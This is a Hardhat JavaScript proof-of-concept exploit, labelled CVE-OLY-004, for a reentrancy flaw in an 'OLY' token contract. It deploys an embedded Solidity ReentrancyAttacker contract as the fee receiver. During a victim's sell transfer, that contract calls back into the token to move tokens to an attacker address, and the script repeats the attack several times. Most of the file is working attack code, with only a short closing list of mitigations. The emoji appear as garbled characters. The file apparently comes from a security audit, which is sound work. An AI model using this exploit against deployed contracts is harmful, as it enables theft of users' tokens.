/**
 * CVE-OLY-004: Reentrancy Attack Exploit
 * 
 * CRITICAL VULNERABILITY PROOF OF CONCEPT
 * 
 * This exploit demonstrates how the external call to fee receiver during
 * transfer execution can be exploited for reentrancy attacks to manipulate
 * contract state and potentially steal tokens.
 * 
 * ‚ö†Ô∏è FOR TESTNET USE ONLY - DO NOT RUN ON MAINNET
 */

const { ethers } = require("hardhat");
const { expect } = require("chai");

async function main() {
    console.log("üî¥ CVE-OLY-004: Reentrancy Attack Exploit");
    console.log("=" .repeat(60));
    
    // Get signers
    const [deployer, attacker, victim, mainPair] = await ethers.getSigners();
    
    console.log("üë§ Deployer:", deployer.address);
    console.log("üè¥‚Äç‚ò†Ô∏è Attacker:", attacker.address);
    console.log("üòá Victim:", victim.address);
    console.log("üè™ Main Pair:", mainPair.address);
    console.log("");

    // Step 1: Deploy reentrancy attack contract
    console.log("üìã Step 1: Deploying Reentrancy Attack Contract...");
    
    const ReentrancyAttacker = await ethers.getContractFactory("ReentrancyAttacker");
    const attackContract = await ReentrancyAttacker.deploy();
    await attackContract.waitForDeployment();
    
    console.log("üíÄ Reentrancy Attacker deployed at:", await attackContract.getAddress());

    // Step 2: Deploy OLY contract with attack contract as fee receiver
    console.log("\nüìã Step 2: Deploying OLY Contract with Attack Contract as Fee Receiver...");
    
    const OLY = await ethers.getContractFactory("OLY");
    const oly = await OLY.deploy(await attackContract.getAddress(), 3000); // 3% buy fee
    await oly.waitForDeployment();
    
    console.log("ü™ô OLY Contract deployed at:", await oly.getAddress());
    
    // Set the OLY contract address in the attack contract
    await attackContract.setOLYContract(await oly.getAddress());
    await attackContract.setAttacker(attacker.address);

    // Step 3: Setup contract state
    console.log("\nüìã Step 3: Setting up Contract State...");
    
    await oly.setMainPair(mainPair.address);
    const MINT_ROLE = await oly.MINT();
    await oly.grantRole(MINT_ROLE, deployer.address);
    
    // Mint tokens for testing
    const mintAmount = ethers.parseUnits("10000", 9);
    await oly.mint(victim.address, mintAmount);
    await oly.mint(mainPair.address, mintAmount);
    await oly.mint(attacker.address, mintAmount);
    
    console.log("‚úÖ Main pair set to:", mainPair.address);
    console.log("‚úÖ Tokens minted to victim:", ethers.formatUnits(mintAmount, 9));
    console.log("‚úÖ Tokens minted to main pair:", ethers.formatUnits(mintAmount, 9));
    console.log("‚úÖ Tokens minted to attacker:", ethers.formatUnits(mintAmount, 9));

    // Step 4: Record initial state
    console.log("\nüìã Step 4: Recording Initial State...");
    
    const initialTotalSupply = await oly.totalSupply();
    const initialAttackerBalance = await oly.balanceOf(attacker.address);
    const initialVictimBalance = await oly.balanceOf(victim.address);
    const initialMainPairBalance = await oly.balanceOf(mainPair.address);
    const initialAttackContractBalance = await oly.balanceOf(await attackContract.getAddress());
    
    console.log("üìä Initial Total Supply:", ethers.formatUnits(initialTotalSupply, 9));
    console.log("üìä Initial Attacker Balance:", ethers.formatUnits(initialAttackerBalance, 9));
    console.log("üìä Initial Victim Balance:", ethers.formatUnits(initialVictimBalance, 9));
    console.log("üìä Initial Main Pair Balance:", ethers.formatUnits(initialMainPairBalance, 9));
    console.log("üìä Initial Attack Contract Balance:", ethers.formatUnits(initialAttackContractBalance, 9));

    // Step 5: Setup the reentrancy attack
    console.log("\nüìã Step 5: Setting up Reentrancy Attack...");
    
    const attackAmount = ethers.parseUnits("1000", 9);
    
    // Configure the attack contract
    await attackContract.setReentrancyTarget(victim.address);
    await attackContract.setReentrancyAmount(ethers.parseUnits("500", 9));
    await attackContract.enableAttack();
    
    console.log("üéØ Attack configured:");
    console.log("   ‚Ä¢ Target: Steal from", victim.address);
    console.log("   ‚Ä¢ Reentrancy amount:", ethers.formatUnits(ethers.parseUnits("500", 9), 9));
    console.log("   ‚Ä¢ Attack enabled: true");

    // Step 6: Execute the reentrancy attack
    console.log("\nüìã Step 6: Executing Reentrancy Attack...");
    
    console.log("üöÄ Victim initiating sell transaction...");
    console.log("üíÄ Attack contract will perform reentrancy during fee collection...");
    
    try {
        // Victim sells tokens, triggering the reentrancy attack
        const tx = await oly.connect(victim).transfer(mainPair.address, attackAmount);
        await tx.wait();
        
        console.log("‚úÖ Transaction completed");
        
    } catch (error) {
        console.log("‚ùå Transaction failed:", error.message);
        
        if (error.message.includes("reentrant") || error.message.includes("ReentrancyGuard")) {
            console.log("‚úÖ Reentrancy protection detected - vulnerability mitigated");
        } else {
            console.log("üíÄ Unexpected error - may indicate successful attack");
        }
    }

    // Step 7: Analyze attack results
    console.log("\nüìã Step 7: Analyzing Attack Results...");
    
    const finalTotalSupply = await oly.totalSupply();
    const finalAttackerBalance = await oly.balanceOf(attacker.address);
    const finalVictimBalance = await oly.balanceOf(victim.address);
    const finalMainPairBalance = await oly.balanceOf(mainPair.address);
    const finalAttackContractBalance = await oly.balanceOf(await attackContract.getAddress());
    
    console.log("üìä Final Balances:");
    console.log("üìä Final Attacker Balance:", ethers.formatUnits(finalAttackerBalance, 9));
    console.log("üìä Final Victim Balance:", ethers.formatUnits(finalVictimBalance, 9));
    console.log("üìä Final Main Pair Balance:", ethers.formatUnits(finalMainPairBalance, 9));
    console.log("üìä Final Attack Contract Balance:", ethers.formatUnits(finalAttackContractBalance, 9));
    console.log("üìä Final Total Supply:", ethers.formatUnits(finalTotalSupply, 9));
    
    // Calculate changes
    const attackerGain = finalAttackerBalance - initialAttackerBalance;
    const victimLoss = initialVictimBalance - finalVictimBalance;
    const mainPairGain = finalMainPairBalance - initialMainPairBalance;
    const attackContractGain = finalAttackContractBalance - initialAttackContractBalance;
    const supplyChange = finalTotalSupply - initialTotalSupply;
    
    console.log("\nüìà Balance Changes:");
    console.log("üìà Attacker Change:", ethers.formatUnits(attackerGain, 9));
    console.log("üìà Victim Loss:", ethers.formatUnits(victimLoss, 9));
    console.log("üìà Main Pair Gain:", ethers.formatUnits(mainPairGain, 9));
    console.log("üìà Attack Contract Gain:", ethers.formatUnits(attackContractGain, 9));
    console.log("üìà Total Supply Change:", ethers.formatUnits(supplyChange, 9));

    // Step 8: Check for reentrancy indicators
    console.log("\nüìã Step 8: Checking for Reentrancy Indicators...");
    
    const attackCount = await attackContract.attackCount();
    const lastAttackAmount = await attackContract.lastAttackAmount();
    
    console.log("üîç Attack Statistics:");
    console.log("   ‚Ä¢ Attack count:", attackCount.toString());
    console.log("   ‚Ä¢ Last attack amount:", ethers.formatUnits(lastAttackAmount, 9));
    
    if (attackCount > 0n) {
        console.log("üö® REENTRANCY ATTACK DETECTED!");
        console.log("üíÄ Attack contract successfully called back into OLY contract");
        
        if (attackerGain > 0n) {
            console.log("üí∞ TOKENS STOLEN: Attacker gained", ethers.formatUnits(attackerGain, 9), "tokens");
        }
        
        if (supplyChange !== 0n) {
            console.log("üö® TOTAL SUPPLY MANIPULATION DETECTED!");
        }
    } else {
        console.log("‚úÖ No reentrancy detected - contract may have protection");
    }

    // Step 9: Test multiple reentrancy attempts
    console.log("\nüìã Step 9: Testing Multiple Reentrancy Attempts...");
    
    try {
        // Reset attack counter
        await attackContract.resetAttack();
        
        // Configure for multiple attacks
        await attackContract.setMaxAttacks(3);
        await attackContract.enableAttack();
        
        console.log("üîÑ Attempting multiple reentrancy attacks...");
        
        const multiAttackAmount = ethers.parseUnits("200", 9);
        await oly.connect(victim).transfer(mainPair.address, multiAttackAmount);
        
        const finalAttackCount = await attackContract.attackCount();
        console.log("üìä Total attacks executed:", finalAttackCount.toString());
        
        if (finalAttackCount > 1n) {
            console.log("üö® MULTIPLE REENTRANCY SUCCESSFUL!");
            console.log("üíÄ Contract vulnerable to repeated reentrancy");
        }
        
    } catch (error) {
        console.log("‚ùå Multiple reentrancy test failed:", error.message);
    }

    // Step 10: Impact Assessment
    console.log("\nüìã Step 10: Impact Assessment");
    console.log("=" .repeat(60));
    
    console.log("üîç VULNERABILITY ANALYSIS:");
    console.log("   ‚Ä¢ External call occurs during state changes");
    console.log("   ‚Ä¢ No reentrancy protection (ReentrancyGuard)");
    console.log("   ‚Ä¢ Fee receiver can call back into contract");
    console.log("   ‚Ä¢ State manipulation possible during execution");
    console.log("");
    
    console.log("üí∞ POTENTIAL FINANCIAL IMPACT:");
    console.log("   ‚Ä¢ Token theft through balance manipulation");
    console.log("   ‚Ä¢ State consistency violations");
    console.log("   ‚Ä¢ Unpredictable contract behavior");
    console.log("   ‚Ä¢ Potential total supply manipulation");
    console.log("");
    
    console.log("üõ°Ô∏è MITIGATION REQUIRED:");
    console.log("   ‚Ä¢ Implement ReentrancyGuard from OpenZeppelin");
    console.log("   ‚Ä¢ Apply nonReentrant modifier to _transfer function");
    console.log("   ‚Ä¢ Move external calls to end of function");
    console.log("   ‚Ä¢ Use checks-effects-interactions pattern");

    console.log("\nüî¥ REENTRANCY EXPLOIT ANALYSIS COMPLETED");
    console.log("‚ö†Ô∏è This demonstrates CRITICAL reentrancy vulnerability");
}

// Reentrancy Attack Contract Source
const reentrancyAttackerSource = `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IOLY {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

/**
 * @title ReentrancyAttacker
 * @dev This contract demonstrates reentrancy attacks on the OLY contract
 * ‚ö†Ô∏è FOR TESTING PURPOSES ONLY
 */
contract ReentrancyAttacker {
    IOLY public olyContract;
    address public attacker;
    address public reentrancyTarget;
    uint256 public reentrancyAmount;
    bool public attackEnabled;
    uint256 public maxAttacks = 1;
    uint256 public attackCount;
    uint256 public lastAttackAmount;
    
    event AttackExecuted(uint256 count, uint256 amount);
    event ReentrancyAttempt(address target, uint256 amount);
    
    function setOLYContract(address _oly) external {
        olyContract = IOLY(_oly);
    }
    
    function setAttacker(address _attacker) external {
        attacker = _attacker;
    }
    
    function setReentrancyTarget(address _target) external {
        reentrancyTarget = _target;
    }
    
    function setReentrancyAmount(uint256 _amount) external {
        reentrancyAmount = _amount;
    }
    
    function enableAttack() external {
        attackEnabled = true;
    }
    
    function disableAttack() external {
        attackEnabled = false;
    }
    
    function setMaxAttacks(uint256 _max) external {
        maxAttacks = _max;
    }
    
    function resetAttack() external {
        attackCount = 0;
        lastAttackAmount = 0;
    }
    
    /**
     * @dev This function is called during fee collection and performs reentrancy
     */
    function triggerSwapFeeForLottery() external {
        if (!attackEnabled || attackCount >= maxAttacks) {
            return;
        }
        
        attackCount++;
        lastAttackAmount = reentrancyAmount;
        
        emit ReentrancyAttempt(reentrancyTarget, reentrancyAmount);
        
        // Reentrancy attack: call back into OLY contract during execution
        try olyContract.transfer(attacker, reentrancyAmount) {
            emit AttackExecuted(attackCount, reentrancyAmount);
        } catch {
            // Attack failed, but we tried
        }
    }
    
    /**
     * @dev Fallback to receive tokens
     */
    receive() external payable {}
}
`;

// Export for use in other scripts
module.exports = {
    main,
    reentrancyAttackerSource
};

// Run if called directly
if (require.main === module) {
    main()
        .then(() => process.exit(0))
        .catch((error) => {
            console.error("üí• Exploit failed:", error);
            process.exit(1);
        });
}